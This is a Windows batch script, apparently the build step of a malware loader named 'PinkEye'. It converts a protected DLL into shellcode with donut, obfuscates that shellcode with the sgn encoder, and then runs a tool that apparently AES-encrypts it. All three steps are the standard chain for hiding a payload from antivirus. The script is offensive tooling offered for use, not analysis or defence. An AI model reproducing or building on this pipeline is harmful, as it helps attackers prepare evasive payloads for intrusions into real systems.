@echo off
donut.exe -a 2 -o "shellcode.bin" -i "PinkEye_Shellcode.vmp.dll" -b 1 -k 2 -x 3
sgn.exe -i "shellcode.bin" -o "shellcode.bin" -a 64 -S
AESEncrypt_PinkEye.exe
pause
exit